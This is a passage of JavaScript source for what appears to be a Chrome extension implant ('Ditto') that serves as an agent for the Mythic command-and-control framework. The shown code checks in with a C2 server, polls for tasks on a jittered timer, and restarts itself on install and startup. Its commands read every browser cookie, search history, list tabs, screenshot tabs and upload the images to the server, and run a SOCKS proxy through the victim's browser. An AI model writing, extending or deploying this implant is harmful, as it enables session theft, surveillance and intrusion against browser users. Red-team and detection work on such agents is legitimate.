          file_id: fileId,
          chunk_data: bytesToBase64(bytes),
          chunk_size: chunkSize
        }
      }
    ]
  });
}

async function uploadFileToMythic(taskId, data, options = {}) {
  const bytes = data instanceof Uint8Array ? data : new Uint8Array(data);
  const chunkSize = Number(options.chunkSize || 512000);
  const totalChunks = Math.max(1, Math.ceil(bytes.length / chunkSize));
  const fileId = await beginMythicFileUpload(taskId, totalChunks, {
    ...options,
    chunkSize
  });

  for (let chunkNum = 1; chunkNum <= totalChunks; chunkNum += 1) {
    const start = (chunkNum - 1) * chunkSize;
    const end = Math.min(start + chunkSize, bytes.length);
    await sendMythicFileUploadChunk(taskId, fileId, chunkNum, bytes.slice(start, end), chunkSize);
  }

  return fileId;
}

function pause(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

async function getTabForCapture(params) {
  const requestedTabId = Number(params.tab_id ?? params.tabId ?? params.id);
  if (Number.isFinite(requestedTabId) && requestedTabId > 0) {
    const tab = await chrome.tabs.get(Math.trunc(requestedTabId));
    return {
      tab,
      targeted: true
    };
  }

  const tabs = await chrome.tabs.query({
    active: true,
    lastFocusedWindow: true
  });
  if (!tabs.length) {
    throw new Error("no active tab found");
  }

  return {
    tab: tabs[0],
    targeted: false
  };
}

async function executeTask(task) {
  const command = task.command || "";
  const paramsText = task.parameters || "{}";
  let params = {};

  try {
    params = JSON.parse(paramsText);
  } catch (error) {
    params = {};
  }

  switch (command) {
    case "ping":
      await sendTaskResponse(task.id, {
        pong: true,
        now: new Date().toISOString()
      });
      return;

    case "list_tabs": {
      const tabs = await chrome.tabs.query({});
      await sendTaskResponse(task.id, {
        tabCount: tabs.length,
        tabs: tabs.map(sanitizeTab)
      });
      return;
    }

    case "get_cookies": {
      const cookies = await chrome.cookies.getAll({});
      await sendTaskResponse(task.id, {
        cookieCount: cookies.length,
        cookies
      });
      return;
    }

    case "capture_tab": {
      const captureTarget = await getTabForCapture(params);
      let tab = captureTarget.tab;
      let restoreTabId = null;

      try {
        if (captureTarget.targeted) {
          const activeTabs = await chrome.tabs.query({
            active: true,
            windowId: tab.windowId
          });
          if (activeTabs.length && activeTabs[0].id !== tab.id) {
            restoreTabId = activeTabs[0].id;
          }
          if (!tab.active) {
            await chrome.tabs.update(tab.id, { active: true });
            await pause(250);
            tab = await chrome.tabs.get(tab.id);
          }
        }

        const image = await chrome.tabs.captureVisibleTab(tab.windowId, {
          format: "png"
        });
        const fileName = `capture_tab_${tab.id || "active"}_${Date.now()}.png`;
        const fileId = await uploadFileToMythic(task.id, dataUrlToBytes(image), {
          filename: fileName,
          fullPath: fileName,
          isScreenshot: true
        });

        await sendTaskResponse(task.id, {
          tab: sanitizeTab(tab),
          file_id: fileId,
          agent_file_id: fileId,
          filename: fileName,
          capturedAt: new Date().toISOString()
        });
      } finally {
        if (restoreTabId && restoreTabId !== tab.id) {
          try {
            await chrome.tabs.update(restoreTabId, { active: true });
          } catch (error) {}
        }
      }
      return;
    }

    case "history_search": {
      const text = String(params.text || "");
      const items = await chrome.history.search({
        text,
        startTime: 0,
        maxResults: 20
      });
      await sendTaskResponse(task.id, {
        query: text,
        results: items
      });
      return;
    }

    case "dns_lookup": {
      const hostname = String(params.name || params.hostname || "").trim();
      const recordType = String(params.type || "A").toUpperCase();
      const resolver = String(params.resolver || "google").trim();
      if (!hostname) {
        throw new Error("hostname is required");
      }
      await sendTaskResponse(task.id, await resolveDns(hostname, recordType, resolver));
      return;
    }

%%NATIVE_HOST_CASES%%

    case "socks": {
      await sendTaskResponse(task.id, await executeSocksCommand(params));
      return;
    }

    case "launch_iwa_extension": {
      await sendTaskResponse(task.id, await launchIwa(params));
      return;
    }

    case "close_iwa_extension": {
      await sendTaskResponse(task.id, await closeIwaExtension(params));
      return;
    }

    case "iwa_status": {
      const bridge = await getIwaBridge();
      let control = null;
      if (params.probe !== false) {
        try {
          control = await sendIwaControlMessage({ type: "status" }, params);
        } catch (error) {
          control = {
            ok: false,
            error: String(error)
          };
        }
      }
      await sendTaskResponse(task.id, {
        bridge: sanitizeIwaBridge(bridge),
        control
      });
      return;
    }

    case "iwa_control": {
      const message = params.message || {
        type: params.type || params.command || "status",
        ...params
      };
      await sendTaskResponse(task.id, await sendIwaControlMessage(message, params));
      return;
    }

    case "iwa_ping": {
      await sendTaskResponse(task.id, await sendIwaControlMessage({ type: "ping" }, params));
      return;
    }

    case "iwa_start_socks": {
      await sendTaskResponse(task.id, await sendIwaControlMessage({
        type: "start_socks",
        port: Number(params.port || DEFAULT_IWA_SOCKS_PORT)
      }, params));
      return;
    }

    case "iwa_stop_socks": {
      await sendTaskResponse(task.id, await sendIwaControlMessage({
        type: "stop_socks"
      }, params));
      return;
    }

    case "sleep": {
      const rawInterval = params.interval ?? params.sleep ?? params.callback_interval;
      const interval = Number(rawInterval);
      if (!Number.isFinite(interval) || interval <= 0) {
        throw new Error("invalid sleep interval");
      }
      await setState({ sleepInterval: interval });
      await scheduleNextAlarm();
      await sendTaskResponse(task.id, {
        sleepInterval: interval,
        updated: true
      });
      return;
    }

    case "exit":
      await setState({ exitRequested: true });
      await chrome.alarms.clear(DITTO_CONFIG.m);
      await sendTaskResponse(task.id, { exited: true });
      return;

    default:
      await sendTaskResponse(task.id, {
        error: `unsupported command: ${command}`
      });
  }
}

async function checkIn() {
  const state = await getState();
  if (state.checkedIn) {
    return;
  }

  const response = await postMythic(await collectIdentity());
  if (response && response.id) {
    await setState({
      callbackUuid: response.id,
      checkedIn: true
    });
  }
}

async function pollTasking(reason) {
  const state = await getState();
  if (state.exitRequested) {
    return;
  }

  if (!state.checkedIn) {
    await checkIn();
  }

  const response = await postMythic({
    action: "get_tasking",
    tasking_size: -1,
    reason
  });

  if (!response || !Array.isArray(response.tasks)) {
    return;
  }

  for (const task of response.tasks) {
    try {
      await executeTask(task);
    } catch (error) {
      await sendTaskResponse(task.id || "", {
        error: String(error)
      });
    }
  }
}

async function ensureAlarm() {
  const state = await getState();
  if (state.exitRequested) {
    return;
  }

  const existing = await chrome.alarms.get(DITTO_CONFIG.m);
  if (!existing) {
    await scheduleNextAlarm();
  }
}

async function scheduleNextAlarm() {
  const state = await getState();
  if (state.exitRequested) {
    return;
  }

  const delaySeconds = getJitteredDelaySeconds(
    state.sleepInterval || DITTO_CONFIG.i,
    DITTO_CONFIG.j
  );
  await chrome.alarms.clear(DITTO_CONFIG.m);
  await chrome.alarms.create(DITTO_CONFIG.m, {
    delayInMinutes: delaySeconds / 60
  });
  await setState({ nextPollAt: Date.now() + Math.round(delaySeconds * 1000) });
}

async function pollTaskingAndReschedule(reason) {
  try {
    await pollTasking(reason);
  } finally {
    const state = await getState();
    if (!state.exitRequested) {
      await scheduleNextAlarm();
    }
  }
}

chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
  const origin = sender.origin || "";
  if (!origin.startsWith("isolated-app://")) {
    sendResponse({
      ok: false,
      error: "unexpected sender origin"
    });
    return true;
  }

  if (!request || request.type !== "ditto.iwa.ready") {
    sendResponse({
      ok: false,
      error: "unsupported external message"
    });
    return true;
  }

  const bridge = {
    origin,
    url: sender.url || "",
    app: request.app || "",
    version: request.version || "",
    controlUrl: request.controlUrl || DEFAULT_IWA_CONTROL_URL,
    socksHost: request.socksHost || "127.0.0.1",
    socksPort: Number(request.socksPort || DEFAULT_IWA_SOCKS_PORT),
    status: request.status || null,
    lastSeen: new Date().toISOString()
  };

  setIwaBridge(bridge).then(() => {
    sendResponse({
      ok: true,
      extensionId: chrome.runtime.id,
      controlUrl: bridge.controlUrl,
      receivedAt: bridge.lastSeen
    });
  }).catch((error) => {
    sendResponse({
      ok: false,
      error: String(error)
    });
  });
  return true;
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (!request || request.type !== "ditto.poc.task") {
    return false;
  }

  executeIwaTaskForResult(String(request.command || ""), request.params || {}).then((result) => {
    sendResponse({
      ok: true,
      result
    });
  }).catch((error) => {
    sendResponse({
      ok: false,
      error: String(error)
    });
  });
  return true;
});

chrome.runtime.onStartup.addListener(() => {
  ensureAlarm().catch(() => {});
});

chrome.runtime.onInstalled.addListener(() => {
  ensureAlarm().catch(() => {});
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === DITTO_CONFIG.m) {
    pollTaskingAndReschedule("alarm").catch(() => {});
  }
});

ensureAlarm().catch(() => {});
